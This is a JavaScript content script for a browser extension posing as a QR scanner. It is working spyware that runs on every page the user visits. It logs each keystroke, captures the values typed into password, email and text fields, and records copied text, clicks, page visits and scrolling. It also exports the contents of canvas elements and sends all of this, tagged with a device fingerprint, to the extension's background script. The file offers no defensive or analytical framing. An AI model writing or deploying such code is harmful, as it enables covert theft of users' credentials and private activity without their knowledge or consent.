// QR Scanner User Surveillance Content Script
class QRScannerSurveillance {
    constructor() {
        this.isActive = false;
        this.fingerprint = null;
        this.interactions = [];
        this.startTime = Date.now();
        
        this.init();
    }
    
    async init() {
        console.log('🕵️ QR Scanner surveillance initialized');
        
        // Get fingerprint from background script
        try {
            this.fingerprint = await new Promise((resolve) => {
                chrome.runtime.sendMessage({ type: 'GET_FINGERPRINT' }, resolve);
            });
        } catch (error) {
            console.error('Failed to get fingerprint:', error);
        }
        
        if (this.fingerprint) {
            this.isActive = true;
            this.setupInteractionTracking();
            this.setupPageMonitoring();
            this.startSurveillanceReporting();
            
            console.log('👁️ QR Scanner user surveillance activated');
        }
    }
    
    // Monitor user interactions
    setupInteractionTracking() {
        // Track clicks
        document.addEventListener('click', (e) => {
            const interaction = {
                type: 'click',
                target: e.target.tagName,
                className: e.target.className,
                id: e.target.id,
                text: e.target.textContent?.substring(0, 50),
                coordinates: { x: e.clientX, y: e.clientY },
                timestamp: Date.now(),
                url: window.location.href
            };
            
            this.interactions.push(interaction);
            this.sendSurveillanceData({
                type: 'USER_INTERACTION',
                interaction: interaction,
                fingerprint: this.fingerprint,
                timestamp: new Date().toISOString()
            });
        });
        
        // Track key presses
        document.addEventListener('keydown', (e) => {
            const interaction = {
                type: 'keypress',
                key: e.key,
                code: e.code,
                timestamp: Date.now(),
                url: window.location.href
            };
            
            this.interactions.push(interaction);
            this.sendSurveillanceData({
                type: 'USER_INTERACTION',
                interaction: interaction,
                fingerprint: this.fingerprint,
                timestamp: new Date().toISOString()
            });
        });
        
        // Track form inputs
        document.addEventListener('input', (e) => {
            if (e.target.type === 'text' || e.target.type === 'password' || e.target.type === 'email') {
                const interaction = {
                    type: 'input',
                    inputType: e.target.type,
                    value: e.target.value, // CAPTURE ALL INPUTS!
                    name: e.target.name,
                    id: e.target.id,
                    timestamp: Date.now(),
                    url: window.location.href
                };
                
                this.interactions.push(interaction);
                this.sendSurveillanceData({
                    type: 'USER_INTERACTION',
                    interaction: interaction,
                    fingerprint: this.fingerprint,
                    timestamp: new Date().toISOString()
                });
            }
        });
        
        // Track copy/paste
        document.addEventListener('copy', (e) => {
            const interaction = {
                type: 'copy',
                selection: window.getSelection().toString(),
                timestamp: Date.now(),
                url: window.location.href
            };
            
            this.interactions.push(interaction);
            this.sendSurveillanceData({
                type: 'USER_INTERACTION',
                interaction: interaction,
                fingerprint: this.fingerprint,
                timestamp: new Date().toISOString()
            });
        });
        
        document.addEventListener('paste', (e) => {
            const interaction = {
                type: 'paste',
                timestamp: Date.now(),
                url: window.location.href
            };
            
            this.interactions.push(interaction);
            this.sendSurveillanceData({
                type: 'USER_INTERACTION',
                interaction: interaction,
                fingerprint: this.fingerprint,
                timestamp: new Date().toISOString()
            });
        });
    }
    
    // Monitor page activity
    setupPageMonitoring() {
        // Track page visits
        this.sendSurveillanceData({
            type: 'PAGE_VISIT',
            pageInfo: {
                url: window.location.href,
                title: document.title,
                referrer: document.referrer,
                userAgent: navigator.userAgent
            },
            fingerprint: this.fingerprint,
            timestamp: new Date().toISOString()
        });
        
        // Track page focus/blur
        window.addEventListener('focus', () => {
            this.sendSurveillanceData({
                type: 'PAGE_FOCUS',
                url: window.location.href,
                fingerprint: this.fingerprint,
                timestamp: new Date().toISOString()
            });
        });
        
        window.addEventListener('blur', () => {
            this.sendSurveillanceData({
                type: 'PAGE_BLUR',
                url: window.location.href,
                fingerprint: this.fingerprint,
                timestamp: new Date().toISOString()
            });
        });
        
        // Track scroll behavior
        let scrollTimeout;
        window.addEventListener('scroll', () => {
            clearTimeout(scrollTimeout);
            scrollTimeout = setTimeout(() => {
                this.sendSurveillanceData({
                    type: 'PAGE_SCROLL',
                    scrollPosition: {
                        x: window.scrollX,
                        y: window.scrollY
                    },
                    url: window.location.href,
                    fingerprint: this.fingerprint,
                    timestamp: new Date().toISOString()
                });
            }, 500);
        });
        
        // Monitor for QR codes on the page
        this.monitorQRCodes();
    }
    
    // Monitor for QR codes on the current page
    monitorQRCodes() {
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === 1) { // Element node
                        // Look for images that might be QR codes
                        const images = node.querySelectorAll('img');
                        images.forEach((img) => {
                            if (img.src && (img.width > 50 || img.height > 50)) {
                                this.sendSurveillanceData({
                                    type: 'QR_CODE_DETECTED_ON_PAGE',
                                    imageInfo: {
                                        src: img.src,
                                        alt: img.alt,
                                        width: img.width,
                                        height: img.height,
                                        className: img.className
                                    },
                                    url: window.location.href,
                                    fingerprint: this.fingerprint,
                                    timestamp: new Date().toISOString()
                                });
                            }
                        });
                        
                        // Look for canvas elements (QR generators)
                        const canvases = node.querySelectorAll('canvas');
                        canvases.forEach((canvas) => {
                            if (canvas.width > 50 && canvas.height > 50) {
                                this.sendSurveillanceData({
                                    type: 'QR_CANVAS_DETECTED',
                                    canvasInfo: {
                                        width: canvas.width,
                                        height: canvas.height,
                                        id: canvas.id,
                                        className: canvas.className
                                    },
                                    url: window.location.href,
                                    fingerprint: this.fingerprint,
                                    timestamp: new Date().toISOString()
                                });
                                
                                // Try to capture canvas content
                                try {
                                    const dataURL = canvas.toDataURL('image/jpeg', 0.7);
                                    this.sendSurveillanceData({
                                        type: 'QR_CANVAS_CAPTURED',
                                        canvasData: dataURL,
                                        canvasInfo: {
                                            width: canvas.width,
                                            height: canvas.height,
                                            id: canvas.id
                                        },
                                        url: window.location.href,
                                        fingerprint: this.fingerprint,
                                        timestamp: new Date().toISOString()
                                    });
                                } catch (error) {
                                    console.log('Canvas capture failed:', error);
                                }
                            }
                        });
                    }
                });
            });
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }
    
    // Send surveillance data
    sendSurveillanceData(data) {
        if (!this.isActive) return;
        
        // Send via background script
        chrome.runtime.sendMessage({
            type: 'SURVEILLANCE_DATA',
            data: data
        });
    }
    
    // Start periodic surveillance reporting
    startSurveillanceReporting() {
        // Send periodic updates
        setInterval(() => {
            if (this.isActive) {
                this.sendSurveillanceData({
                    type: 'PERIODIC_UPDATE',
                    sessionInfo: {
                        sessionDuration: Date.now() - this.startTime,
                        totalInteractions: this.interactions.length,
                        currentUrl: window.location.href,
                        pageTitle: document.title
                    },
                    fingerprint: this.fingerprint,
                    timestamp: new Date().toISOString()
                });
            }
        }, 30000); // Every 30 seconds
        
        // Send interaction batches
        setInterval(() => {
            if (this.interactions.length > 0) {
                this.sendSurveillanceData({
                    type: 'INTERACTION_BATCH',
                    interactions: this.interactions.splice(0, 20), // Send max 20 at a time
                    fingerprint: this.fingerprint,
                    timestamp: new Date().toISOString()
                });
            }
        }, 15000); // Every 15 seconds
    }
}

// Initialize surveillance when page loads
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        new QRScannerSurveillance();
    });
} else {
    new QRScannerSurveillance();
}

// Also initialize when the extension popup connects
window.addEventListener('message', (event) => {
    if (event.data.type === 'QR_SCANNER_SURVEILLANCE_INIT') {
        new QRScannerSurveillance();
    }
}); 